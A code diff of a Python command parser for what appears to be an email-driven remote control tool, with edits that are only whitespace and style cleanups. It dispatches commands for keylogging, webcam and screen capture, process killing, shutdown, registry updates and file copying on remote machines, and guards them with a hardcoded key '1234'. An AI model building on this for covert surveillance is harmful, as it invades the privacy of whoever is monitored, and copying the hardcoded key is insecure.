@@ -15,17 +15,17 @@ def get_corresponding_ip(email_address):
         LIST_PROC (Name, PID, threads)
         LIST_APP (Name, ID, threads)
         KILL <ID/PID>, ACK/Err
-    
+
     * CAPTURING
         SCREENSHOT <seconds>, a video
         WEB/REC <seconds>, a video
         KEYLOG <seconds>, a list of actions
-    
+
     * HIGHER PRIVILEGE COMMANDS
         SHUTDOWN/RESTART, ACK, call DISC afterwards
         REGISTRY, DIR:
             LIST <path to folder>, list of "directory/files"
-            
+
         REGISTRY UPDATE <absolute path> <value> <data-type>, ACK
         DIR COPY <src path> <dst path folder>, ACK
 """
@@ -36,7 +36,7 @@ def command_parser(message, sender_address):
     print('After split: ', msg)
 
     key = '1234'
-    
+
     try:
         if len(msg) > 5: # too many arguments
             raise Exception("Too many arguments")
@@ -53,7 +53,7 @@ def command_parser(message, sender_address):
                     handler.registry_update(ip_address, msg[2], msg[3], msg[4])
                 else:
                     raise Exception("Invalid command")
-        
+
         elif len(msg) == 4:
             if msg[0] == "DIR":
                 if msg[1] == "COPY":
@@ -66,14 +66,14 @@ def command_parser(message, sender_address):
 
             else:
                 raise Exception("Invalid command")
-        
+
         elif len(msg) == 3:
             if msg[0] == "AUTH":
                 if msg[1] != key:
                     raise Exception("Invalid key")
 
-                if handler.is_valid_ip(msg[2]) == False:
-                    raise Exception("Invalid IP")  
+                if not handler.is_valid_ip(msg[2]):
+                    raise Exception("Invalid IP")
 
                 # if the code goes here, it will start connection to the IP at msg[2]
                 # ip_address = msg[2]
@@ -116,7 +116,7 @@ def command_parser(message, sender_address):
                     raise Exception("No corresponding IP")
                 handler.kill_process(ip_address, msg[1])
             elif msg[0] == "WEB" or msg[0] == "REC":
-                if msg[1].isdigit() == False:
+                if not msg[1].isdigit():
                     raise Exception("Invalid number of seconds")
                 else:
                     ip_address = get_corresponding_ip(sender_address)
@@ -124,7 +124,7 @@ def command_parser(message, sender_address):
                         raise Exception("No corresponding IP")
                     handler.capture_webcam(ip_address, int(msg[1]))
             elif msg[0] == "KEYLOG":
-                if msg[1].isdigit() == False:
+                if not msg[1].isdigit():
                     raise Exception("Invalid number of seconds")
                 else:
                     ip_address = get_corresponding_ip(sender_address)
@@ -132,7 +132,7 @@ def command_parser(message, sender_address):
                         raise Exception("No corresponding IP")
                     handler.keylog(ip_address, int(msg[1]))
             elif msg[0] == "SCREENSHOT":
-                if msg[1].isdigit() == False:
+                if not msg[1].isdigit():
                     raise Exception("Invalid number of seconds")
                 else:
                     ip_address = get_corresponding_ip(sender_address)
@@ -142,7 +142,7 @@ def command_parser(message, sender_address):
             else:
                 raise Exception("Invalid command")
         else:
-            if msg[0] == "DISC": # disconnect 
+            if msg[0] == "DISC": # disconnect
                 handler.disconnect(sender_address)
             elif msg[0] == "LIST_PROC":
                 ip_address = get_corresponding_ip(sender_address)
@@ -190,4 +190,4 @@ def command_parser(message, sender_address):
             else:
                 raise Exception("Invalid command")
     except Exception as e:
-        handler.raise_error_message(e)      
+        handler.raise_error_message(e)
